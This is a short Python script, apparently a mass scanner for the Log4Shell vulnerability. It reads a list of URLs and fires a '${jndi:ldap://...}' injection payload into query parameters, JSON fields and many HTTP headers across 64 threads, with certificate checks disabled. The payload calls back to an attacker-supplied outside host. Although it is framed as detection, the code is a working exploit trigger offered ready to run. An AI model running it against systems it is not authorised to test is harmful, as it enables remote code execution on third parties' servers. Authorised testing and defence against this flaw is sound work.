from sys import argv
from requests import get,post
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor

disable_warnings()

proxies = {}
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
thread_count = 64


def sendDetectionRequest(url, urlId):
    try:
        payload = '${jndi:ldap://' +  argv[2] + '/Log4jRCE}'
        params = {
            'id':payload,
            'user':payload,
            'username':payload,
            'email':payload,
            'password':payload,
        }
        headers = {
            'User-Agent':payload, 
            'Referer':payload, 
            'Origin':payload,
            'Cookie':payload,
            'Accept-Datetime':payload,
            'Accept-Encoding':payload,
            'Accept-Language':payload,
        }
        url = url.strip()
        print('[{}] Testing {}'.format(urlId, url))
        get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
        post(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
        post(url, headers=headers, json=params, verify=False, proxies=proxies, timeout=10)
    except Exception as e:
        print('Exception on urlId={}, url={}:'.format(urlId, url))
        print(e)
        print(e.__cause__)
        print(e.__traceback__)
        pass

threads = []
urlId = 0
if len(argv) > 1:
    urlFile = open(argv[1], 'r')
    urlList = urlFile.readlines()
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for url in urlList:
            urlId += 1
            threads.append(executor.submit(sendDetectionRequest, url, urlId))

else:
    print('[!] Syntax: python3 {} <urlFile> <collaboratorPayload>'.format(argv[0]))
